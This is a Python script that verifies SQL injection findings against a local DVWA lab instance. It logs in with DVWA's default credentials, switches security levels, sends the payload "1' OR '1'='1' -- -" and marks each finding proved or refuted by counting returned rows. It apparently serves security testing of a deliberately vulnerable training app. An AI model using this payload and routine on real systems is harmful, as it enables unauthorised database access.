import re
import json
import requests
from pathlib import Path
from datetime import datetime


# ============================================================
# CONFIGURATION - adjust if your setup differs
# ============================================================

BASE_URL = "http://localhost/DVWA"
LOGIN_URL = f"{BASE_URL}/login.php"
SECURITY_URL = f"{BASE_URL}/security.php"
SQLI_URL = f"{BASE_URL}/vulnerabilities/sqli/"

USERNAME = "admin"
PASSWORD = "password"

FINDINGS_FILE = Path("data/findings/findings_20260928_035329.json")


# ============================================================
# SESSION SETUP - log in
# ============================================================

def get_authenticated_session():

    session = requests.Session()

    login_page = session.get(LOGIN_URL)

    token_match = re.search(
        r"name='user_token' value='([^']+)'",
        login_page.text
    )

    if not token_match:
        raise RuntimeError(
            "Could not find login CSRF token. "
            "Is DVWA running at " + LOGIN_URL + " ?"
        )

    csrf_token = token_match.group(1)

    login_response = session.post(
        LOGIN_URL,
        data={
            "username": USERNAME,
            "password": PASSWORD,
            "Login": "Login",
            "user_token": csrf_token
        }
    )

    if "login.php" in login_response.url:
        raise RuntimeError(
            "Login failed. Check USERNAME/PASSWORD in this script."
        )

    print("Logged into DVWA successfully.")

    return session


# ============================================================
# SECURITY LEVEL HANDLING
# ============================================================

def set_security_level(session, level):
    """
    level must be one of: 'low', 'medium', 'high'
    """

    security_page = session.get(SECURITY_URL)

    token_match = re.search(
        r"name='user_token' value='([^']+)'",
        security_page.text
    )

    if token_match:
        session.post(
            SECURITY_URL,
            data={
                "security": level,
                "seclev_submit": "Submit",
                "user_token": token_match.group(1)
            }
        )
        print(f"Security level set to {level.capitalize()}.")


def get_security_level_from_path(file_path):
    """
    Reads the intended security level from the finding's
    file path, e.g. '...\\sqli\\source\\medium.php' -> 'medium'
    """

    path_lower = file_path.lower()

    if "high.php" in path_lower:
        return "high"
    elif "medium.php" in path_lower:
        return "medium"
    else:
        return "low"


# ============================================================
# SEND ONE SQLI TEST REQUEST
# ============================================================

def send_sqli_request(session, id_payload):

    response = session.get(
        SQLI_URL,
        params={
            "id": id_payload,
            "Submit": "Submit"
        }
    )

    return response.text


def count_user_rows(html_text):

    return len(re.findall(r"First name:", html_text))


# ============================================================
# TEST ONE FINDING
# ============================================================

def test_sqli_finding(session, finding):

    baseline_html = send_sqli_request(session, "1")
    baseline_count = count_user_rows(baseline_html)

    payload = "1' OR '1'='1' -- -"
    payload_html = send_sqli_request(session, payload)
    payload_count = count_user_rows(payload_html)

    evidence = (
        f"Baseline request id=1 returned {baseline_count} user row(s). "
        f"Payload request id={payload} returned {payload_count} user row(s)."
    )

    if payload_count > baseline_count and baseline_count >= 1:
        status = "PROVED"
        evidence += " Payload returned more rows than baseline, confirming SQL injection."

    elif payload_count == baseline_count:
        status = "REFUTED"
        evidence += " Payload returned the same number of rows as baseline, no injection detected."

    else:
        status = "NEEDS_HUMAN"
        evidence += " Result was inconclusive and requires manual review."

    return status, evidence


# ============================================================
# MAIN
# ============================================================

def main():

    if not FINDINGS_FILE.exists():
        print(f"Findings file not found: {FINDINGS_FILE}")
        return

    with open(FINDINGS_FILE, "r", encoding="utf-8") as f:
        findings = json.load(f)

    print(f"Loaded {len(findings)} findings from {FINDINGS_FILE}")

    session = get_authenticated_session()

    updated_count = 0

    for finding in findings:

        vulnerability = finding.get("vulnerability", "")
        parameter = finding.get("parameter", "")

        if "sql injection" not in vulnerability.lower():
            continue

        if parameter != "id":
            continue

        file_path = finding.get("file_path", "")
        level = get_security_level_from_path(file_path)

        print(f"\nTesting finding: {finding.get('finding_id')}")
        print(f"File: {file_path}")
        print(f"Using security level: {level}")

        set_security_level(session, level)

        status, evidence = test_sqli_finding(session, finding)

        finding["oracle_status"] = status
        finding["oracle_evidence"] = evidence

        print(f"Result: {status}")
        print(evidence)

        updated_count += 1

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_path = FINDINGS_FILE.parent / f"oracle_results_{timestamp}.json"

    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(findings, f, indent=2)

    print(f"\n{updated_count} finding(s) tested by the oracle.")
    print(f"Saved results to: {output_path}")


if __name__ == "__main__":
    main()